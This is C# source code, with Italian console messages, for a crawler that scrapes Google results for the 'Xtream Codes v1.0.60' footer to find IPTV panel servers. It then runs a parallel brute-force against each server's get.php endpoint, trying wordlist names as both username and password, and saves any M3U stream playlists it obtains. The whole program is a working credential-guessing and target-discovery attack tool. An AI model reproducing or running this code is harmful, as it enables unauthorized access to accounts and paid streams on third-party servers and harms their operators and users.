using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace MyTestCrawler
{
	class Program
	{
		static List<string> names;
		static void Main(string[] args)
		{
			MainAsync(args).ConfigureAwait(false).GetAwaiter().GetResult();
		}

		async static Task MainAsync(string[] args)
		{
			Console.Write("Caricamento nomi... ");
			await LoadNames();
			Console.WriteLine("[DONE] -> trovati " + names.Count + " nomi");
			Console.Write("Caricamento url... ");
			var urls = await GetUrls();
			Console.WriteLine("[DONE] -> trovati " + urls.Length + " url");
			Console.WriteLine("Inizio brute force...");
			ForcingUrls(urls);
			Console.WriteLine("[DONE]");
		}
		static CancellationToken ct = new CancellationToken();
		private static void ForcingUrls(string[] urls)
		{
			Parallel.ForEach(urls, new ParallelOptions {
				CancellationToken = ct,
				MaxDegreeOfParallelism = 4
			} , (source, state, ix) => {
				Console.WriteLine("   > " + source);
				BruteForce(source, state, ix).Wait();
				Console.WriteLine("   > " + source + " [DONE]");
			});
		}

		static async Task LoadNames() {
			var files = Directory.EnumerateFiles(Path.Combine(Environment.CurrentDirectory, "nomi"), "*.txt", SearchOption.TopDirectoryOnly);
			var ListaNomi = new List<string>();
			foreach (var item in files)
			{
				var nomi = await File.ReadAllLinesAsync(item);
				ListaNomi = ListaNomi.Union(nomi).Distinct().ToList();
			}
			await File.AppendAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "nomi", "tutti.lista"), ListaNomi);
			Random rnd = new Random();
			names = ListaNomi.OrderBy(x => rnd.Next()).ToList();
		}

		static async Task BruteForce(string url, ParallelLoopState state, long index)
		{
			Uri urlInfo = new Uri(url);
			var outDir = Path.Combine(Environment.CurrentDirectory, "out", urlInfo.Host);
			if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);
			HttpClient client = new HttpClient();
			client.DefaultRequestHeaders.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

			foreach (var user in names)
			{
				var fileName = Path.Combine(outDir, user + ".m3u");
				try
				{
					var req = await client.GetAsync($"{url}/get.php?username={user}&password={user}&type=m3u_plus&output=mpegts");
					Console.WriteLine("   > " + url + " user " + user + "\t\t" + req.StatusCode);
					if (req.StatusCode != System.Net.HttpStatusCode.OK)
						break;
					else {
#if DEBUG
						//Debugger.Break();
#endif
						var testo = await req.Content.ReadAsStringAsync();
						if (!string.IsNullOrWhiteSpace(testo))
						{
							Console.WriteLine("   > " + url + " < trovata lista: " + fileName);
							await File.AppendAllTextAsync(fileName, testo);
						}
					}
				} catch(HttpRequestException ex) {
				}
			}

		}

		async static Task<string[]> GetUrls() {
			var old = await File.ReadAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"));
			string[] urls = old.Select(f => f.TrimEnd('/')).ToArray();
#if RELEASE
			var x = 0;
			while (true)
			{
				HttpClient client = new HttpClient();
				var response = await client.GetAsync("https://www.google.it/search?q=%22Xtream+Codes+v1.0.60+Copyright%22&num=100&ei=kkb5WpLPCs_R5gKU_bOQCg&start=" + x + "&sa=N&filter=0&biw=1600&bih=779");
				var pageContents = await response.Content.ReadAsStringAsync();
				HtmlDocument pageDocument = new HtmlDocument();
				pageDocument.LoadHtml(pageContents);

				var headlineText = pageDocument.DocumentNode
					.SelectNodes("//div/ol")
					.Where(f => f != null && f.ParentNode != null && f.ParentNode.Id == "ires").ToList();
				if (headlineText.Count() == 0)
					break;

				var lines = headlineText.First()
					.SelectNodes("//h3/a")
					.Select(f => f.GetAttributeValue("href", "").Replace("/interstitial?url=", "").Replace("/url?q=", ""))
					.Where(f => f != "")
					.ToList()
					.Select(f =>
					{
						Uri uri;
						Uri.TryCreate(f, UriKind.RelativeOrAbsolute, out uri);
						return uri;
					})
					.Select(f => {
						if (f.IsAbsoluteUri)
							return f.OriginalString.Replace(f.PathAndQuery, "");
						else {
							return "";
						}
					})
					.Distinct()
					.ToList();

				if (lines.Count == 0) break;

				urls = urls.Union(lines).Distinct().ToArray();
				x += 100;
			}
#endif
			await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"), urls);
			return urls;
		}
	}
}
